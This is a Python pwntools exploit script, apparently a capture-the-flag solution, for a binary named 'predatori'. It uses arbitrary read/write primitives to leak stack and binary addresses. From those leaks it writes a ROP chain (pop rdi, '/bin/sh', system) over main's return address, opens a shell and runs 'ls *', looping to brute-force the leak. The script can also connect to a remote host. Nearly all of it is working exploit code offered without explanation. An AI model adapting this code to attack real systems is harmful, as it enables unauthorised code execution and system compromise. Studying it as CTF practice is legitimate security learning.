#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('predatori')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
break *main+310
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def www(addr, val):
    io.sendline("2")
    io.send(p64(addr) + b'\x08')
    io.send(p64(val))


def rww(addr, lsb=True):
    io.sendline("1")
    if lsb:
        io.send(p8(addr))
    else:
        io.send(p64(addr))


def solve():
    www(0x7ffff7fff000, 0x1337) # does nothing!
    # sleep(0.1)
    try:
        rww(0x10, lsb=True)
        io.recvuntil("richiesta...\n")
        io.recvuntil("richiesta...\n")
        stack_leak = u64(io.recvline()[0:6].ljust(8, b'\x00'))
        main_ret = stack_leak + 0xa8

        rww(0x48, lsb=True) 
        io.recvuntil("richiesta...\n")
        bputs = u64(io.recvline()[0:6].ljust(8, b'\x00'))
        info("bputs: %#x", bputs)
        exe.address = bputs - 0x8e017
        data = exe.address + 0xbc070

        pop_rdi = exe.address + 0x99d1 # pop rdi; ret; 
        system = exe.sym['system']
        sh = next(exe.search(b'/bin/sh\x00'))
        
        info("stack leak: %#x", stack_leak)
        info("main stack frame: %#x", main_ret)
        info("elf base: %#x", exe.address)
        info("data: %#x", data)
        
        www(main_ret, pop_rdi)
        www(main_ret+8, sh)
        www(main_ret+16, system)

        io.sendline("3")
        io.sendline("ls *")
        print(io.recvline())
        io.close()
    except Exception:
        io.close()


def main():
    for i in range(0xf):
        for j in range(0xf):
            init()
            solve()

if __name__ == '__main__':
    main()